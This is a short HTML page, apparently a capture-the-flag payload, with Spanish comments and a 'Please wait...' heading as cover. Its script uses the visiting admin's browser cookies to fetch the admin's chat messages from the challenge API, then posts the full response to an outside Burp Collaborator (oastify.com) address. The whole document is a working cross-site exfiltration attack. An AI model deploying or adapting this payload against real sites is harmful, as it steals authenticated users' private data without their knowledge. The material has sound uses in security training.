<!doctype html>
<html>
  <body>
    <h1>Please wait...</h1>
    <script>
      (async () => {
        try {
          // 1) Petición al chat del admin usando las cookies del navegador del admin
          const res = await fetch('http://twfszwtpdgg-0.playat.flagyard.com/api/chats/1/messages', {
            credentials: 'include'            // muy importante para que vaya autenticado
          });

          const body = await res.text();      // leemos la respuesta completa

          // 2) Exfiltramos la respuesta a tu Burp Collaborator
          await fetch('https://4afdmate0wbld0v1omdp0ba65xbozen3.oastify.com/', {
            method: 'POST',
            mode: 'no-cors',                  // así no nos importa el CORS de oastify
            body: body
          });
        } catch (e) {
          // opcional, por si quieres debug
        }
      })();
    </script>
  </body>
</html>
